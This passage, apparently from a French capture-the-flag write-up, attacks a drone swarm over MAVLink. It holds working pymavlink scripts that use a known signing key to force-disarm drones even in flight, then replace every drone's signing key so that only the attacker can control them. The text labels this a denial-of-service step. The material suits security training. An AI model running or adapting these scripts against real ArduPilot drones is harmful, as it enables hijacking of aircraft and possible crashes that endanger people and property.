            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
            0,       # 0 = disarm
            21196,   # magic value ArduPilot pour forcer le désarmement même en vol
            0, 0, 0, 0, 0
        )

    if time.time() - last_hb > 1:
        mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        last_hb = time.time()

print("\n[*] Terminé.")
```


![Resize](/images/drones/drone_hacked2.png?width=200px) 


![Resize](/images/drones/dashboard9.png?width=200px) 



## 7. Déni de service 


Afin de prendre 100% le contrôle des drones il est possible de modifier la clé de signature des drones afin de mettre sa propre clé. Ainsi seulement l'attaquant peut avoir accès aux contrôles des drones : 

```python
import os
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil
import time

CONN_STR = 'tcp:0.cloud.chals.io:27838'
CURRENT_KEY_HEX = "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
TARGET_COMPID = 1
TARGET_SYSIDS = [1, 2, 3, 4, 5]

# Nouvelle clé imposée à tout le swarm (32 octets).
# Dans un vrai scénario d'attaque, ce serait une clé connue uniquement de l'attaquant.
NEW_KEY_HEX = "11" * 32

current_key = bytes.fromhex(CURRENT_KEY_HEX)
new_key = bytes.fromhex(NEW_KEY_HEX)

mav = mavutil.mavlink_connection(CONN_STR, source_system=255, source_component=190)
mav.setup_signing(current_key, sign_outgoing=True)

last_hb = 0
disarm_sent = {sysid: False for sysid in TARGET_SYSIDS}
disarm_confirmed_at = {sysid: None for sysid in TARGET_SYSIDS}
setup_sent = {sysid: False for sysid in TARGET_SYSIDS}

WAIT_AFTER_DISARM = 3.0  # laisse le temps au désarmement de se propager avant SETUP_SIGNING

print("[*] Rotation de la clé de signature sur tout le swarm...")
print(f"[*] Ancienne clé : {CURRENT_KEY_HEX}")
print(f"[*] Nouvelle clé : {NEW_KEY_HEX}\n")

while True:
    msg = mav.recv_match(
        type=["STATUSTEXT", "COMMAND_ACK", "HEARTBEAT"],
        blocking=True, timeout=1
    )

    if msg is not None:
        t = msg.get_type()
        sysid = msg.get_srcSystem()

        if sysid in TARGET_SYSIDS:
            if t == "STATUSTEXT":
                print(f"[STATUSTEXT] sys={sysid} : {msg.text}")
            elif t == "COMMAND_ACK":
                print(f"[COMMAND_ACK] sys={sysid} cmd={msg.command} result={msg.result}")
            elif t == "HEARTBEAT":
                armed = bool(msg.base_mode & 128)
                if not armed and disarm_confirmed_at[sysid] is None:
                    disarm_confirmed_at[sysid] = time.time()
                    print(f">> sysid={sysid} confirmé DÉSARMÉ")

    # étape 1 : désarmer tous les agents (SETUP_SIGNING refuse si armé)
    for sysid in TARGET_SYSIDS:
        if not disarm_sent[sysid]:
            disarm_sent[sysid] = True
            print(f">> DISARM sysid={sysid}")
            mav.mav.command_long_send(
                sysid, TARGET_COMPID,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
                0, 21196, 0, 0, 0, 0, 0
            )

    # étape 2 : une fois désarmé, envoyer la nouvelle clé
    for sysid in TARGET_SYSIDS:
        if (disarm_confirmed_at[sysid] is not None
                and not setup_sent[sysid]
                and time.time() - disarm_confirmed_at[sysid] > WAIT_AFTER_DISARM):
            setup_sent[sysid] = True
            print(f">> SETUP_SIGNING (nouvelle clé) -> sysid={sysid}")
            mav.mav.setup_signing_send(
                sysid, TARGET_COMPID,
                new_key,
                0  # initial_timestamp, 0 = géré automatiquement côté firmware
            )

    if time.time() - last_hb > 1:
        mav.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS, mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        last_hb = time.time()

    if all(setup_sent.values()):
        print("\n[*] Nouvelle clé envoyée à tous les agents.")
        break

print("\n[*] Rotation terminée.")
print("[!] L'ancienne clé ne fonctionne plus sur AUCUN agent du swarm.")
print(f"[!] Seule la nouvelle clé ({NEW_KEY_HEX}) permet désormais de les contrôler.")
```

![Resize](/images/drones/drone_DOS.png?width=200px) 









